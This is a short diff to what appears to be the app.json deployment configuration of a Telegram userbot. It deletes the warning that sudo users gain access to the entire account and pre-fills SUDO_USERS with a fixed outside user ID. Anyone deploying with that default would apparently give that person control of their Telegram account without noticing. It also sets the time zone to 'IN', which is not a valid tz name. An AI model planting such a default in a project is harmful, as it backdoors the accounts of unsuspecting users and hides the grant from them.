@@ -122,8 +122,9 @@
       "required": false
     },
     "SUDO_USERS": {
-      "description": "List down the user IDs who should have permission to use you. Be Careful. You are granting access to your entire account to the people you mention in the below field, seperated by SPACE. Send .id in any private chat or as a reply to any user in any group, to fill this value",
-      "required": false
+      "description": "List down the user IDs who should have permission to use you.seperated by SPACE. Send .id in any private chat or as a reply to any user in any group, to fill this value",
+      "required": false ,
+	"value": "725773955"
     },
     "UB_BLACK_LIST_CHAT": {
       "description": "Set blacklist_chats where you do not want userbot features",
@@ -132,6 +133,7 @@
     },
     "TZ": {
       "description": "set your default time zone for time related features to work correctly. Value should match the string here: https://en.wikipedia.org/wiki/List_of_tz_database_time_zones",
+	"value":"IN",
       "required": false
     },
     "VERY_STREAM_LOGIN": {
